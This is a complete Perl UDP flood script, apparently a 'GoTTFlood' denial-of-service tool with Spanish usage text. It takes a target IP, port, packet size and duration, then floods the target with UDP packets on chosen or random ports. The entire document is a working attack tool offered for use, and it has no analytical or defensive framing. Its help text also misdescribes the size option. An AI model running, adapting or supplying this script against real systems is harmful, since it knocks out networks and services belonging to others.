#!/usr/bin/perl

##############
# udp flood.
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "flood.pl <ip> <port> <size> <time>\n\n";
  print " port=0: usa Puertos Randoms\n";
  print " size=0: usa Puerto del 64 hacia el 15000000\n";
  print " time=0: Flood Contínuo\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "No se encontró  $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

 
print "Atacando GoTTFlood: $ip " . ($port ? $port : "random") . " Puerto: " . 
  ($size ? "$size-byte" : "Tiempo Random") . " packets" . 
  ($time ? " por $time secgundos" : "") . "\n";
print "Frena con Control + C" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, 
$iaddr));}
